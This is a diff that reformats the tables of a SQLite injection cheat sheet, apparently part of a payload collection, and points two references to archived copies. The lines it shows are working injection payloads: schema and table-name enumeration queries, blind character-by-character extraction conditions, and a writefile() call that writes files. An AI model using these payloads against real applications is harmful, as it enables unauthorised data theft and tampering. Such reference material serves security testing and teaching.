@@ -30,42 +30,42 @@
 
 ## SQLite Enumeration
 
-| Description   | SQL Query |
-| ------------- | ----------------------------------------- |
-| DBMS version  | `select sqlite_version();`                |
+| Description  | SQL Query                  |
+| ------------ | -------------------------- |
+| DBMS version | `select sqlite_version();` |
 
 ## SQLite String
 
 ### SQLite String Methodology
 
-| Description             | SQL Query                                 |
-| ----------------------- | ----------------------------------------- |
-| Extract Database Structure                           | `SELECT sql FROM sqlite_schema` |
-| Extract Database Structure (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master` |
-| Extract Table Name  | `SELECT tbl_name FROM sqlite_master WHERE type='table'` |
-| Extract Table Name  | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` |
-| Extract Column Name | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'` |
-| Extract Column Name | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');` |
-| Extract Column Name | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'` |
-| Extract Column Name | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')` |
+| Description                                          | SQL Query                                                                                              |
+| ---------------------------------------------------- | ------------------------------------------------------------------------------------------------------ |
+| Extract Database Structure                           | `SELECT sql FROM sqlite_schema`                                                                        |
+| Extract Database Structure (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master`                                                                        |
+| Extract Table Name                                   | `SELECT tbl_name FROM sqlite_master WHERE type='table'`                                                |
+| Extract Table Name                                   | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` |
+| Extract Column Name                                  | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'`             |
+| Extract Column Name                                  | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');`                      |
+| Extract Column Name                                  | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'`                                     |
+| Extract Column Name                                  | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')`                                                   |
 
 ## SQLite Blind
 
 ### SQLite Blind Methodology
 
-| Description             | SQL Query                                 |
-| ----------------------- | ----------------------------------------- |
-| Count Number Of Tables  | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table` |
-| Enumerating Table Name  | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number` |
-| Extract Info            | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')` |
+| Description             | SQL Query                                                                                                                                                                                              |
+| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| Count Number Of Tables  | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table`                                                                               |
+| Enumerating Table Name  | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number`                                                       |
+| Extract Info            | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')`                                                    |
 | Extract Info (order by) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END` |
 
 ### SQLite Blind With Substring Equivalent
 
-| Function    | Example                                   |
-| ----------- | ----------------------------------------- |
-| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`  |
-| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |
+| Function    | Example                                  |
+| ----------- | ---------------------------------------- |
+| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)` |
+| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`    |
 
 ## SQlite Error Based
 
@@ -150,6 +150,6 @@ SELECT writefile('/path/to/file', column_name) FROM table_name
 
 ## References
 
-* [Injecting SQLite database based application - Manish Kishan Tanwar - February 14, 2017](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
-* [SQLite Error Based Injection for Enumeration - Rio Asmara Suryadi - February 6, 2021](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)
+* [Injecting SQLite database based application - Manish Kishan Tanwar - February 14, 2017](https://web.archive.org/web/20211205031408/https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
+* [SQLite Error Based Injection for Enumeration - Rio Asmara Suryadi - February 6, 2021](https://web.archive.org/web/20210221065923/http://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)
 * [SQLite3 Injection Cheat sheet - Nickosaurus Hax - May 31, 2012](https://web.archive.org/web/20131208191957/https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
